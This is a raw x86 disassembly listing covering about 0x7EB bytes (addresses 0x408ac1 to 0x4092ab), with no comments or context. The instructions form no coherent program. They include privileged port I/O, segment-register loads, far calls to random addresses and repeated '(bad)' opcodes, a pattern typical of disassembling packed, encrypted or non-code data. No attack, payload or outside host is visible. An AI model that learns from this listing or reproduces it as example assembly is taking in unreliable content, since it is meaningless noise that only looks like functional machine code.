  408ac1:	mov    esp,0x16284719
  408ac6:	mov    al,ds:0xa76e791f
  408acb:	and    edi,DWORD PTR [ebp+0x65]
  408ace:	xor    ch,BYTE PTR [ecx]
  408ad0:	fimul  WORD PTR [edx-0x15c65baa]
  408ad6:	sbb    eax,0x59788875
  408adb:	dec    ebp
  408adc:	lahf   
  408add:	mov    cl,0xd4
  408adf:	pop    ebp
  408ae0:	out    0x48,al
  408ae2:	xchg   esi,eax
  408ae3:	jnp    0x408a73
  408ae5:	in     al,0xcc
  408ae7:	inc    edi
  408ae8:	loopne 0x408b49
  408aea:	sti    
  408aeb:	cld    
  408aec:	mov    ebx,0xa181bd72
  408af1:	retf   0x2a5c
  408af4:	and    bl,BYTE PTR [ebp-0x41]
  408af7:	sbb    ecx,edx
  408af9:	add    DWORD PTR [ebx-0x13a0f7db],ecx
  408aff:	mov    esi,0xffd7f458
  408b04:	mov    ch,0xeb
  408b06:	jnp    0x408a91
  408b08:	pop    ebx
  408b09:	sbb    BYTE PTR [edi-0x6504fdf1],bl
  408b0f:	inc    BYTE PTR [esi-0x253cb680]
  408b15:	pop    es
  408b16:	ret    
  408b17:	push   es
  408b18:	dec    edx
  408b19:	rcl    DWORD PTR [ebx],cl
  408b1b:	push   eax
  408b1c:	mov    ah,0x3
  408b1e:	mov    ch,0x72
  408b20:	pop    edi
  408b21:	push   0x8e884e86
  408b26:	mov    dh,0xf5
  408b28:	mov    bh,ah
  408b2a:	dec    ecx
  408b2b:	(bad)  
  408b2c:	mov    eax,ds:0xad4c0b65
  408b31:	and    BYTE PTR [ebx],dh
  408b33:	mov    dl,0x72
  408b35:	adc    BYTE PTR [eax-0x49],dh
  408b38:	xlat   BYTE PTR ds:[ebx]
  408b39:	cdq    
  408b3a:	outs   dx,BYTE PTR ds:[esi]
  408b3b:	fsub   DWORD PTR [eax+0x17]
  408b3e:	das    
  408b3f:	xchg   ecx,eax
  408b40:	jb     0x408b92
  408b42:	daa    
  408b43:	repnz xor dl,BYTE PTR [esi+0xe8ae444]
  408b4a:	or     al,0x5e
  408b4c:	ficom  WORD PTR [ebp+0x39]
  408b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b50:	das    
  408b51:	loop   0x408bb4
  408b53:	push   edi
  408b54:	fld    QWORD PTR [eax+esi*4-0x5a]
  408b58:	in     eax,0xd9
  408b5a:	jp     0x408b02
  408b5c:	pop    ecx
  408b5d:	inc    ebx
  408b5e:	or     eax,0x8febcdf9
  408b63:	adc    bl,dh
  408b65:	push   edi
  408b66:	pop    edx
  408b67:	icebp  
  408b68:	mov    ebx,0x764cbdf8
  408b6d:	push   esp
  408b6e:	shl    BYTE PTR [ebx+edi*1],cl
  408b71:	push   ss
  408b72:	inc    ebx
  408b73:	mov    edi,0xa203291c
  408b78:	das    
  408b79:	daa    
  408b7a:	xchg   edx,eax
  408b7b:	in     eax,dx
  408b7c:	cmp    dh,BYTE PTR [edi]
  408b7e:	xor    ah,BYTE PTR [edx]
  408b80:	mov    cs,WORD PTR ds:[edx-0x26]
  408b84:	or     eax,0xa96e6a14
  408b89:	pop    es
  408b8a:	push   ecx
  408b8b:	ror    BYTE PTR [edx+0x44],1
  408b8e:	ret    
  408b8f:	hlt    
  408b90:	into   
  408b91:	jae    0x408b7a
  408b93:	test   ch,dh
  408b95:	stc    
  408b96:	test   eax,0x22bbbdad
  408b9b:	xchg   esp,eax
  408b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9d:	and    eax,0x43556f61
  408ba2:	(bad)  [eax+0x64427536]
  408ba8:	loopne 0x408b98
  408baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bab:	add    al,0x24
  408bad:	pop    ds
  408bae:	(bad)  
  408baf:	push   ebx
  408bb0:	cs push es
  408bb2:	mov    edx,0xf4b20f64
  408bb7:	push   ebx
  408bb8:	scas   al,BYTE PTR es:[edi]
  408bb9:	mov    ah,0x70
  408bbb:	shr    ebx,1
  408bbd:	adc    DWORD PTR fs:[esi-0x55],eax
  408bc1:	int3   
  408bc2:	add    eax,0x5cfd640c
  408bc7:	sub    DWORD PTR [edi],0x8d93757d
  408bcd:	repz popf 
  408bcf:	pop    esi
  408bd0:	lock repnz in al,dx
  408bd3:	mov    ss,WORD PTR [eax+ebx*8+0x1fae4ab8]
  408bda:	call   0x37861098
  408bdf:	pop    ecx
  408be0:	(bad)
  408be5:	mov    al,0x86
  408be7:	xchg   ecx,eax
  408be8:	pop    edx
  408be9:	add    eax,0x95b4ff98
  408bee:	adc    BYTE PTR [esi-0x2f],0x71
  408bf2:	xchg   ecx,eax
  408bf3:	test   BYTE PTR [eax+eax*1],0xaf
  408bf7:	repz sti 
  408bf9:	fadd   QWORD PTR [ebp-0x4d]
  408bfc:	xchg   ecx,edi
  408bfe:	inc    edi
  408bff:	fdiv   st(1),st
  408c01:	loope  0x408b86
  408c03:	stc    
  408c04:	jo     0x408bc1
  408c06:	loopne 0x408c6d
  408c08:	fldenv [ebp+eax*1+0x7fd55850]
  408c0f:	sar    BYTE PTR [ebp+0x64],1
  408c12:	or     esp,ecx
  408c14:	addr16 in eax,dx
  408c16:	sbb    BYTE PTR [esi-0x1b],ch
  408c19:	(bad)  
  408c1a:	in     al,dx
  408c1b:	add    eax,0x6c690eed
  408c20:	aad    0x63
  408c22:	cmp    esi,edx
  408c24:	inc    esi
  408c25:	push   ebp
  408c26:	or     al,0x42
  408c28:	cmp    BYTE PTR fs:0x2880371a,ch
  408c2f:	push   0x4052cfff
  408c34:	mov    ebx,0x9cd7c4b2
  408c39:	aaa    
  408c3a:	xor    cl,BYTE PTR [esi+edx*8+0x41]
  408c3e:	iret   
  408c3f:	or     ah,al
  408c41:	dec    ebp
  408c42:	fst    QWORD PTR [ecx+ecx*2-0xc]
  408c46:	bsr    edi,DWORD PTR [ebx]
  408c49:	dec    ebx
  408c4a:	or     eax,0x68eefb8
  408c4f:	cs jecxz 0x408ca5
  408c52:	push   es
  408c53:	aam    0x85
  408c55:	mov    eax,0xb2f985fa
  408c5a:	mov    edi,0x6e749fd0
  408c5f:	aam    0x63
  408c61:	icebp  
  408c62:	call   0xe6c3b7a2
  408c67:	dec    edi
  408c68:	sub    cl,bl
  408c6a:	pop    ss
  408c6b:	cmp    al,BYTE PTR [edi]
  408c6d:	inc    edi
  408c6e:	in     al,dx
  408c6f:	fild   DWORD PTR [ebx+0x58]
  408c72:	cli    
  408c73:	loop   0x408c4e
  408c75:	pushf  
  408c76:	fstp   QWORD PTR [ebx+ebp*4-0xd1bc61a]
  408c7d:	imul   si,WORD PTR [ecx],0xff98
  408c81:	or     bl,bh
  408c83:	push   0x57
  408c85:	mov    ch,0xfa
  408c87:	fwait
  408c88:	imul   ecx,DWORD PTR [ebx+esi*1],0x5c
  408c8c:	fcmovbe st,st(1)
  408c8e:	add    al,0xd7
  408c90:	xchg   BYTE PTR [esi-0x1ea082d4],bl
  408c96:	adc    bh,BYTE PTR [ecx+0x71557f86]
  408c9c:	out    dx,al
  408c9d:	test   DWORD PTR [ebp-0x5c],esi
  408ca0:	fstp   DWORD PTR [edx-0x6]
  408ca3:	test   eax,0x768877f7
  408ca8:	mov    gs,WORD PTR [edx+0x2a]
  408cab:	sahf   
  408cac:	cld    
  408cad:	pop    edx
  408cae:	xchg   edx,eax
  408caf:	dec    edx
  408cb0:	loopne 0x408cb0
  408cb2:	ins    BYTE PTR es:[edi],dx
  408cb3:	dec    edi
  408cb4:	jle    0x408c83
  408cb6:	and    BYTE PTR [esi-0x559d3c49],bh
  408cbc:	xor    DWORD PTR [esi-0x34db3721],esp
  408cc2:	das    
  408cc3:	inc    esp
  408cc4:	fwait
  408cc5:	pusha  
  408cc6:	mov    cl,0x20
  408cc8:	xor    DWORD PTR [ebx-0x22],ebp
  408ccb:	inc    ecx
  408ccc:	stc    
  408ccd:	inc    edi
  408cce:	fbstp  TBYTE PTR [ecx]
  408cd0:	ins    DWORD PTR es:[edi],dx
  408cd1:	mov    ecx,0xc3c890b6
  408cd6:	test   eax,0x2be9d065
  408cdb:	jbe    0x408d08
  408cdd:	out    dx,al
  408cde:	loopne 0x408cb9
  408ce0:	rcr    ebp,1
  408ce2:	adc    al,0x51
  408ce4:	add    DWORD PTR [ebx+0xf16b4cf],eax
  408cea:	arpl   WORD PTR [eax*8+0x2bcf333],di
  408cf1:	sbb    edi,DWORD PTR [eax+0x3b3e11b8]
  408cf7:	retf   
  408cf8:	mov    ebx,0xc247959
  408cfd:	push   esi
  408cfe:	push   ecx
  408cff:	in     eax,dx
  408d00:	test   eax,0x5293f7d
  408d05:	mov    esi,0x204cfbb4
  408d0a:	adc    ah,bl
  408d0c:	test   al,0xb
  408d0e:	push   esp
  408d0f:	arpl   WORD PTR [eax-0x70],si
  408d12:	jo     0x408d85
  408d14:	xlat   BYTE PTR ds:[ebx]
  408d15:	pop    esi
  408d16:	imul   edi,DWORD PTR [ebp-0x9f9c4a5],0x52
  408d1d:	xchg   ecx,eax
  408d1e:	add    edx,DWORD PTR [esi+ecx*8+0x49]
  408d22:	jno    0x408d19
  408d24:	addr16 push ecx
  408d26:	and    eax,0x8dd7b371
  408d2b:	sbb    al,0x49
  408d2d:	imul   ebx,DWORD PTR [edi],0x62
  408d30:	icebp  
  408d31:	stc    
  408d32:	or     edi,DWORD PTR [ecx+0x63d03630]
  408d38:	push   es
  408d39:	jno    0x408d65
  408d3b:	(bad)  
  408d3c:	jmp    0x3d970cca
  408d41:	pop    edi
  408d42:	xchg   edi,eax
  408d43:	inc    edx
  408d44:	mov    ah,0x8e
  408d46:	jo     0x408d60
  408d48:	fild   QWORD PTR [ebx-0x31]
  408d4b:	std    
  408d4c:	sub    DWORD PTR [ebp+0x43854323],esi
  408d52:	sti    
  408d53:	dec    esi
  408d54:	jae    0x408dc3
  408d56:	(bad)  
  408d57:	dec    edi
  408d58:	popa   
  408d59:	shl    BYTE PTR [eax+0x5193e55a],0xbb
  408d60:	mov    esp,0x67116d48
  408d65:	mov    eax,ds:0xbd99cfb5
  408d6a:	add    eax,0xdb135dd2
  408d6f:	xchg   ecx,eax
  408d70:	stos   BYTE PTR es:[edi],al
  408d71:	in     eax,dx
  408d72:	retf   0x4d0e
  408d75:	push   edi
  408d76:	inc    ecx
  408d77:	xor    eax,0x1accc023
  408d7c:	push   0x22
  408d7e:	loopne 0x408d13
  408d80:	nop    DWORD PTR [esi+0x60b135e8]
  408d87:	mov    esi,0x4366bdc7
  408d8c:	push   cs
  408d8d:	ds xor eax,0xf656cf97
  408d93:	rcl    DWORD PTR [eax-0x36dc9ca1],cl
  408d99:	cmp    al,0x2f
  408d9b:	xchg   edx,eax
  408d9c:	sbb    cl,BYTE PTR [edx+0x36cf061f]
  408da2:	pop    ebx
  408da3:	nop    DWORD PTR [esi+eax*1]
  408da7:	add    eax,0x911e7c17
  408dac:	mov    DWORD PTR [esi-0x5a],0xe963ee
  408db3:	rcr    DWORD PTR [esi+0x6340f491],cl
  408db9:	in     al,0xf
  408dbb:	imul   edi,ebx,0xb85d9c0a
  408dc1:	push   ecx
  408dc2:	fcom   DWORD PTR [edx+0x29]
  408dc5:	test   eax,0xd22ee030
  408dca:	xor    BYTE PTR [ebx-0x29],ah
  408dcd:	gs sbb eax,0x977afc1e
  408dd3:	pop    es
  408dd4:	test   edx,0xbbeb82de
  408dda:	aas    
  408ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ddc:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408dde:	addr16 repz xchg edi,eax
  408de1:	cwde   
  408de2:	fimul  DWORD PTR [eax+ebp*2-0x6aa64492]
  408de9:	paddw  mm1,mm5
  408dec:	xor    DWORD PTR [edi+0x6814d7f4],esp
  408df2:	xchg   edx,eax
  408df3:	mov    DWORD PTR [ecx],edi
  408df5:	fadd   QWORD PTR [edi+0x1138e6f1]
  408dfb:	adc    al,0xd2
  408dfd:	sar    DWORD PTR [edx+0x2f],0x46
  408e01:	test   al,0x50
  408e03:	ins    DWORD PTR es:[edi],dx
  408e04:	mov    bh,0x22
  408e06:	test   BYTE PTR [edi],bh
  408e08:	mov    edx,0x1ccec265
  408e0d:	pushf  
  408e0e:	lods   eax,DWORD PTR ds:[esi]
  408e0f:	and    ch,BYTE PTR [ebx+0x68]
  408e12:	push   ebp
  408e13:	loop   0x408e5d
  408e15:	test   DWORD PTR [eax],ecx
  408e17:	aam    0x8b
  408e19:	mov    WORD PTR cs:[esi],?
  408e1c:	mov    ss,esi
  408e1e:	cli    
  408e1f:	int    0xd
  408e21:	cli    
  408e22:	loopne 0x408de5
  408e24:	xchg   edx,eax
  408e25:	ficomp WORD PTR [edi]
  408e27:	cmc    
  408e28:	mov    BYTE PTR [ebp+ebx*2+0x57a66f91],cl
  408e2f:	and    BYTE PTR [ebx+0x6f38f9b6],cl
  408e35:	sub    BYTE PTR [ecx-0x5deb829e],ch
  408e3b:	popf   
  408e3c:	lods   al,BYTE PTR ds:[esi]
  408e3d:	loope  0x408e36
  408e3f:	out    0x53,eax
  408e41:	(bad)  
  408e42:	push   edx
  408e43:	add    al,0xda
  408e45:	cmp    al,0x5f
  408e47:	mov    ss,ebp
  408e49:	repz (bad) 
  408e4b:	mov    eax,ds:0x1e3e8b2d
  408e50:	iret   
  408e51:	mov    WORD PTR [ebp+0x203fc54b],fs
  408e57:	fxch   st(3)
  408e59:	ficomp DWORD PTR [esp+edi*1]
  408e5c:	in     eax,0x92
  408e5e:	pop    DWORD PTR [ebp-0x43091c61]
  408e64:	sbb    ch,BYTE PTR [eax-0x5a]
  408e67:	xchg   edx,eax
  408e68:	mov    si,0xa30c
  408e6c:	scas   al,BYTE PTR es:[edi]
  408e6d:	fistp  DWORD PTR [ecx]
  408e6f:	sub    ah,0x60
  408e72:	push   cs
  408e73:	xchg   ebp,eax
  408e74:	(bad)  [ecx+esi*1+0x68d5c0e]
  408e7b:	inc    edx
  408e7c:	sar    cl,1
  408e7e:	mov    bh,0xc1
  408e80:	inc    ecx
  408e81:	cs xchg DWORD PTR gs:[esp+0x36ee3f8c],edi
  408e8a:	jle    0x408e16
  408e8c:	cmc    
  408e8d:	cmp    bl,dh
  408e8f:	mov    esp,0xacaa0ee6
  408e94:	push   edi
  408e95:	cld    
  408e96:	div    DWORD PTR [edi]
  408e98:	icebp  
  408e99:	xor    cl,BYTE PTR [ebp-0x773efe84]
  408e9f:	sbb    ah,BYTE PTR [edi+0x6c]
  408ea2:	mov    dh,0xee
  408ea4:	sub    eax,0x7aceff4c
  408ea9:	movlps xmm0,QWORD PTR [ebx-0x126ff27]
  408eb0:	mov    eax,ebx
  408eb2:	fisub  WORD PTR [ecx-0x22198320]
  408eb8:	ss mov cl,0xca
  408ebb:	cwde   
  408ebc:	cs fs call 0xcfc:0x6a49e2d4
  408ec5:	inc    ebp
  408ec6:	ja     0x408e5f
  408ec8:	dec    eax
  408ec9:	adc    ax,WORD PTR [edi]
  408ecc:	and    al,0xa6
  408ece:	ret    0xf8d4
  408ed1:	sbb    esp,DWORD PTR [ebx-0x74e503f6]
  408ed7:	fwait
  408ed8:	outs   dx,BYTE PTR ds:[esi]
  408ed9:	fdivr  QWORD PTR es:[ebx-0x5d]
  408edd:	and    DWORD PTR [ebx+0x4a4884f5],0xf7c89977
  408ee7:	sbb    dl,BYTE PTR [eax]
  408ee9:	xchg   esi,eax
  408eea:	xchg   esi,eax
  408eeb:	or     bh,BYTE PTR [ebx]
  408eed:	xor    eax,0x6132b5a4
  408ef2:	sbb    esp,DWORD PTR [edi+0x6]
  408ef5:	jmp    0x408f3f
  408ef7:	stos   DWORD PTR es:[edi],eax
  408ef8:	and    DWORD PTR [ebp+0x7c],0x5035d61e
  408eff:	iret   
  408f00:	icebp  
  408f01:	mov    al,0x48
  408f03:	(bad)  
  408f04:	out    0xdc,eax
  408f06:	into   
  408f07:	cli    
  408f08:	test   eax,0x5f82c05
  408f0d:	push   ds
  408f0e:	(bad)  
  408f0f:	push   0xffffffa2
  408f11:	enter  0x7092,0x3f
  408f15:	pop    esi
  408f16:	jge    0x408f24
  408f18:	nop
  408f19:	(bad)  
  408f1a:	adc    dl,BYTE PTR [ebx+0x3e68bba0]
  408f20:	xchg   esi,eax
  408f21:	fild   QWORD PTR [eax+0x1b]
  408f24:	xor    eax,0x3625e89b
  408f29:	fwait
  408f2a:	test   eax,0xc065898e
  408f2f:	mov    al,ds:0x4c630603
  408f34:	pop    ebx
  408f35:	xchg   DWORD PTR [eax+0x7f377b26],ecx
  408f3b:	sbb    al,0x57
  408f3d:	leave  
  408f3e:	push   es
  408f3f:	and    BYTE PTR [eax+0x4e],cl
  408f42:	stc    
  408f43:	xchg   ebp,eax
  408f44:	out    dx,eax
  408f45:	popa   
  408f46:	cmp    eax,0x7514ee71
  408f4b:	imul   esi,esi,0x35
  408f4e:	add    eax,0x8c7ad82c
  408f53:	add    al,0x64
  408f55:	jbe    0x408f0a
  408f57:	mov    dl,0x1b
  408f59:	cmp    edx,esp
  408f5b:	sbb    eax,0x2781569
  408f60:	xchg   ebx,eax
  408f61:	lds    edx,FWORD PTR [esi+ebp*1+0x3f]
  408f65:	jb     0x408fa2
  408f67:	or     BYTE PTR [edx],dl
  408f69:	mov    edx,0xb4635a4d
  408f6e:	mov    cl,0xe9
  408f70:	jmp    0x408f94
  408f72:	(bad)  
  408f73:	mov    ecx,DWORD PTR [eax+0x4bdfe4b9]
  408f79:	push   edx
  408f7a:	adc    al,0xff
  408f7c:	in     eax,dx
  408f7d:	pop    edi
  408f7e:	loop   0x408ffb
  408f80:	repnz cli 
  408f82:	sub    dh,ch
  408f84:	gs mov eax,0x172017a6
  408f8a:	push   es
  408f8b:	xchg   ebx,eax
  408f8c:	in     eax,dx
  408f8d:	cmp    BYTE PTR [eax-0x2d],ah
  408f90:	xor    esp,DWORD PTR [ebx+0x22]
  408f93:	sbb    eax,0x710537e2
  408f98:	jae    0x408f32
  408f9a:	mov    fs,WORD PTR [edi]
  408f9c:	dec    edx
  408f9d:	aaa    
  408f9e:	jo     0x409016
  408fa0:	cmp    DWORD PTR [ebx],edi
  408fa2:	jmp    0x7dd3b99c
  408fa7:	cld    
  408fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fa9:	shl    DWORD PTR [esi+0x1565ed1c],0xf9
  408fb0:	(bad)  
  408fb1:	ss xor bl,dh
  408fb4:	add    dl,ch
  408fb6:	test   BYTE PTR [edi-0x40476edc],ah
  408fbc:	inc    esp
  408fbd:	out    dx,eax
  408fbe:	jge    0x409037
  408fc0:	nop
  408fc1:	mov    al,ds:0x2783f54b
  408fc6:	add    esi,DWORD PTR [edi+0x54615fc6]
  408fcc:	add    esi,esi
  408fce:	into   
  408fcf:	rcr    BYTE PTR [ebp-0x26],1
  408fd2:	and    eax,0x5e7706f1
  408fd7:	in     al,0xe
  408fd9:	and    BYTE PTR [ebx],ch
  408fdb:	out    0x31,eax
  408fdd:	mov    eax,DWORD PTR [edx]
  408fdf:	shl    BYTE PTR [eax-0x3],cl
  408fe2:	cmp    eax,0xbec9a8fd
  408fe7:	push   ebx
  408fe8:	mov    DWORD PTR [ebp+0x3ba6b131],esp
  408fee:	sub    BYTE PTR [esi+eiz*2-0x14],dl
  408ff2:	in     al,dx
  408ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ff4:	pop    esi
  408ff5:	or     al,0xbe
  408ff7:	inc    ecx
  408ff8:	mov    al,ds:0xe63e3a94
  408ffd:	pop    esi
  408ffe:	or     al,0xa6
  409000:	enter  0x2754,0xa2
  409004:	dec    ecx
  409005:	cwde   
  409006:	mov    eax,0xa882b688
  40900b:	add    eax,0x829c6938
  409010:	pop    esp
  409011:	jge    0x40901e
  409013:	add    bl,BYTE PTR [edx]
  409015:	inc    edi
  409016:	outs   dx,DWORD PTR ds:[esi]
  409017:	mov    ecx,0x3240ead2
  40901c:	jbe    0x409008
  40901e:	retf   0xc0e8
  409021:	mov    eax,ds:0xe3846dde
  409026:	sbb    BYTE PTR [edi],dl
  409028:	sbb    ebp,esp
  40902a:	xor    BYTE PTR [ebx],dh
  40902c:	outs   dx,BYTE PTR ds:[esi]
  40902d:	jne    0x409036
  40902f:	adc    BYTE PTR [ecx],dl
  409031:	mov    ah,0x9d
  409033:	(bad)  
  409034:	je     0x409023
  409036:	add    al,0x4f
  409038:	mov    ds:0xa9eae476,eax
  40903d:	in     al,0x8e
  40903f:	push   ebp
  409040:	mov    bl,BYTE PTR [ecx]
  409042:	jbe    0x4090b9
  409044:	fucomp st(3)
  409046:	or     DWORD PTR [ecx+0x6b98efc6],0xfe3b6be5
  409050:	sub    ebp,DWORD PTR [ebx+0x7a]
  409053:	adc    BYTE PTR [ecx],bh
  409055:	and    DWORD PTR [eax+0x14],ebp
  409058:	push   edi
  409059:	ins    DWORD PTR es:[edi],dx
  40905a:	jge    0x409024
  40905c:	out    dx,eax
  40905d:	enter  0xe64a,0x20
  409061:	clc    
  409062:	mov    ebx,0x5f9f183b
  409067:	arpl   WORD PTR [esi+edi*4+0x71],bx
  40906b:	mov    al,0xb8
  40906d:	and    BYTE PTR [ebx-0x75],ch
  409070:	jnp    0x40901c
  409072:	pop    es
  409073:	or     eax,0x67704733
  409078:	fsub   DWORD PTR [ebp-0x24]
  40907b:	mov    cl,0x21
  40907d:	mov    ss,WORD PTR [esi+0x72]
  409080:	or     dh,BYTE PTR [eax+eiz*8+0x39]
  409084:	cli    
  409085:	stc    
  409086:	and    DWORD PTR [edx-0x411abd24],esp
  40908c:	mov    ch,0x44
  40908e:	ret    0x9e5f
  409091:	std    
  409092:	int    0x7d
  409094:	mov    eax,0x9365dacf
  409099:	rcr    BYTE PTR [edx-0x100517fa],1
  40909f:	jecxz  0x409078
  4090a1:	sub    bh,BYTE PTR [ebp-0x5ba121b8]
  4090a7:	sub    eax,0x6e4f48b2
  4090ac:	test   eax,0x97a6b6bf
  4090b1:	bound  eax,QWORD PTR [edi+edi*8+0x63]
  4090b5:	jo     0x4090fa
  4090b7:	add    ecx,DWORD PTR [edi-0x394f553d]
  4090bd:	push   ecx
  4090be:	std    
  4090bf:	loope  0x409079
  4090c1:	cmc    
  4090c2:	mov    DWORD PTR [ebx],ecx
  4090c4:	sbb    eax,0x3d02c6ed
  4090c9:	cmp    eax,0xe96c166c
  4090ce:	or     bh,BYTE PTR [esi-0x226fcce9]
  4090d4:	fisttp DWORD PTR [ecx-0x5e6299d]
  4090da:	inc    eax
  4090db:	cmp    BYTE PTR [ecx+0x5],ch
  4090de:	mov    ch,0x6d
  4090e0:	mov    eax,0xd2283602
  4090e5:	cmp    dh,BYTE PTR [edi+0x15]
  4090e8:	fbstp  TBYTE PTR [ecx+0x272ad552]
  4090ee:	or     dh,al
  4090f0:	sub    eax,0x37c5deb5
  4090f5:	(bad)  
  4090f6:	std    
  4090f7:	or     al,0x5d
  4090f9:	shl    DWORD PTR [eax],1
  4090fb:	pop    ebp
  4090fc:	sbb    ah,dh
  4090fe:	popf   
  4090ff:	sbb    ebp,DWORD PTR [ecx+esi*1]
  409102:	pop    ds
  409103:	mov    eax,0x714b5836
  409108:	push   edx
  409109:	call   0x1012aa8d
  40910e:	int    0xbb
  409110:	xchg   DWORD PTR [edx-0x3d],edx
  409113:	in     eax,0x4a
  409115:	cmp    ah,0xdb
  409118:	cmp    al,0x33
  40911a:	fs in  al,0x3e
  40911d:	test   BYTE PTR [ebx+0x70],dl
  409120:	adc    dh,cl
  409122:	sahf   
  409123:	cmp    al,0x75
  409125:	ret    0x744f
  409128:	sub    al,0xb9
  40912a:	jmp    0x51e9f5
  40912f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409130:	jbe    0x409130
  409132:	sub    al,0xbf
  409134:	mov    ch,0x9d
  409136:	xchg   edx,eax
  409137:	adc    DWORD PTR [edx+ebx*8+0xc],edx
  40913b:	push   edx
  40913c:	pop    esi
  40913d:	or     DWORD PTR [eax+0x54cc37a7],esi
  409143:	dec    edx
  409144:	dec    edi
  409145:	lods   al,BYTE PTR ds:[esi]
  409146:	or     eax,0x284d4385
  40914b:	adc    al,0xe5
  40914d:	out    0x94,al
  40914f:	pop    eax
  409150:	add    ch,bl
  409152:	push   cs
  409153:	or     DWORD PTR [edi+esi*1-0x62039111],esp
  40915a:	pop    edx
  40915b:	icebp  
  40915c:	push   esp
  40915d:	fcmovb st,st(6)
  40915f:	xchg   BYTE PTR [ebp-0x7fcdf490],bl
  409165:	or     eax,0xdca48945
  40916a:	ror    DWORD PTR [esi],0x13
  40916d:	(bad)  
  40916e:	jmp    0x6347:0x8486cb0a
  409175:	xchg   esp,eax
  409176:	mov    cl,0x36
  409178:	pop    ebp
  409179:	retf   0x457f
  40917c:	fsubr  DWORD PTR [esi-0x49]
  40917f:	ins    BYTE PTR es:[edi],dx
  409180:	mov    esp,edi
  409182:	jmp    0x4f2bdfde
  409187:	pop    ds
  409188:	xchg   edx,eax
  409189:	neg    dh
  40918b:	ins    BYTE PTR es:[edi],dx
  40918c:	dec    edi
  40918d:	ds inc edx
  40918f:	mov    ebx,0xdc48cfab
  409194:	xchg   BYTE PTR [edx+ebx*2+0x49],ch
  409198:	int    0x9f
  40919a:	xchg   esi,eax
  40919b:	xchg   edx,edx
  40919d:	(bad)  
  40919e:	int3   
  40919f:	adc    eax,0x2382e373
  4091a4:	or     BYTE PTR [ebp-0x7a],dl
  4091a7:	cmp    dl,cl
  4091a9:	xlat   BYTE PTR ds:[ebx]
  4091aa:	das    
  4091ab:	pop    ebx
  4091ac:	popa   
  4091ad:	shl    BYTE PTR [ebp-0x7baf48c3],cl
  4091b3:	div    DWORD PTR [ebx+0x6fff9a9e]
  4091b9:	mov    ch,0x8a
  4091bb:	jg     0x4091d8
  4091bd:	xchg   ebp,eax
  4091be:	cwde   
  4091bf:	sbb    eax,DWORD PTR [edi+edi*1]
  4091c2:	dec    esi
  4091c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091c4:	repnz inc esp
  4091c6:	aas    
  4091c7:	pusha  
  4091c8:	js     0x4091f0
  4091ca:	pushf  
  4091cb:	inc    edx
  4091cc:	pusha  
  4091cd:	stos   BYTE PTR es:[edi],al
  4091ce:	jno    0x40916f
  4091d0:	mov    ebx,0xffc20435
  4091d5:	pop    esi
  4091d6:	test   DWORD PTR [eax+0x40],esp
  4091d9:	dec    eax
  4091da:	jnp    0x40919f
  4091dc:	fsubrp st(6),st
  4091de:	xor    DWORD PTR [ebp+0x6d],ecx
  4091e1:	sub    DWORD PTR [ecx-0x20],ebp
  4091e4:	das    
  4091e5:	ror    DWORD PTR [edx+0x46503122],cl
  4091eb:	mov    eax,ds:0x4e2cbf24
  4091f0:	cli    
  4091f1:	les    ebx,FWORD PTR [eax+eiz*1+0x5a]
  4091f5:	retf   0x6a5
  4091f8:	adc    ecx,DWORD PTR [esp+edx*1+0x4b]
  4091fc:	sub    dl,BYTE PTR [edi+ecx*1]
  4091ff:	sahf   
  409200:	outs   dx,DWORD PTR ds:[esi]
  409201:	mov    eax,0xd308cec3
  409206:	test   DWORD PTR [ebp-0x7a],ebp
  409209:	(bad)  
  40920a:	cli    
  40920b:	inc    esp
  40920c:	push   es
  40920d:	jl     0x40923c
  40920f:	and    DWORD PTR [esi],ebp
  409211:	and    DWORD PTR [ecx+0x5b06d825],esp
  409217:	add    BYTE PTR [edi-0x2c],dl
  40921a:	jne    0x409213
  40921c:	shufps xmm7,XMMWORD PTR [eax+esi*1],0x7d
  409221:	rol    BYTE PTR [eax+0x4],cl
  409224:	inc    esi
  409225:	pop    es
  409226:	pusha  
  409227:	push   es
  409228:	arpl   WORD PTR [eax+0x7c],sp
  40922b:	cmp    al,0xce
  40922d:	or     BYTE PTR [edi+0x32c821e6],ch
  409233:	loope  0x409256
  409235:	pop    edx
  409236:	or     esi,DWORD PTR [edi+0x47]
  409239:	aas    
  40923a:	sahf   
  40923b:	pop    eax
  40923c:	test   eax,0x438756e3
  409241:	xchg   edx,eax
  409242:	inc    ebx
  409243:	sbb    al,0xf8
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	fist   WORD PTR [edi+0x3d]
  409249:	inc    edx
  40924a:	ret    
  40924b:	and    eax,0x7878912a
  409250:	stc    
  409251:	adc    eax,0x745969c0
  409256:	js     0x409248
  409258:	scas   al,BYTE PTR es:[edi]
  409259:	(bad)  
  40925a:	in     eax,0xe6
  40925c:	(bad)  
  40925d:	pop    es
  40925e:	sbb    eax,0x1866d474
  409263:	add    eax,0x4b235574
  409268:	xchg   BYTE PTR [edx-0x44],bh
  40926b:	jb     0x409213
  40926d:	cld    
  40926e:	mov    ecx,0x806a6438
  409273:	cmp    DWORD PTR [ecx-0x18],eax
  409276:	pop    ebx
  409277:	out    0x95,al
  409279:	jns    0x409265
  40927b:	lods   eax,DWORD PTR ds:[esi]
  40927c:	jb     0x4092f6
  40927e:	jns    0x40929f
  409280:	int3   
  409281:	icebp  
  409282:	or     bh,BYTE PTR [ecx]
  409284:	sub    al,al
  409286:	loopne 0x409273
  409288:	adc    dh,bh
  40928a:	outs   dx,BYTE PTR ds:[esi]
  40928b:	sub    eax,0xf2896145
  409290:	loope  0x409278
  409292:	ret    0x123a
  409295:	adc    BYTE PTR [ecx],dh
  409297:	mul    BYTE PTR [esi-0x5c5cb687]
  40929d:	adc    DWORD PTR [edx-0x54],edx
  4092a0:	mov    al,0x70
  4092a2:	iret   
  4092a3:	lods   eax,DWORD PTR ds:[esi]
  4092a4:	je     0x40925d
  4092a6:	inc    ebx
  4092a7:	stos   DWORD PTR es:[edi],eax
  4092a8:	ret    0xd4af
  4092ab:	clc    
